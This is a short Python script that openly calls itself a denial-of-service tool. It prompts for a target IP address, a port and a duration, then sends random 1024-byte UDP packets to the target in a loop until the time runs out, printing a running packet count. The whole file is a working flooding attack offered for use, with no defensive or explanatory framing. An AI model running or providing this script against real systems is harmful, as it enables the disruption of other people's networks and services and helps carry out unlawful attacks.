import os
import sys
import time
import socket
import random

socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # address and protocols
bytes = random._urandom(1024);
os.system("cls")
print("Welcome to dos attacking..")
print("")

ip = raw_input("Target IP: ")
port = input("port: ")
dur = input("time: ")
timeout = time.time() + dur
sent = 0
print("Attacking the system............")
while True:
    try:
        if time.time() > timeout:
            break
        else:
            pass
        socket.sendto(bytes,(ip, port))
        sent = sent + 1
        print("Sent %s packets to %s through port %s" %(sent, ip, port))
    except KeyboardInterrupt:
        print("Cancelled..")
        sys.exit()
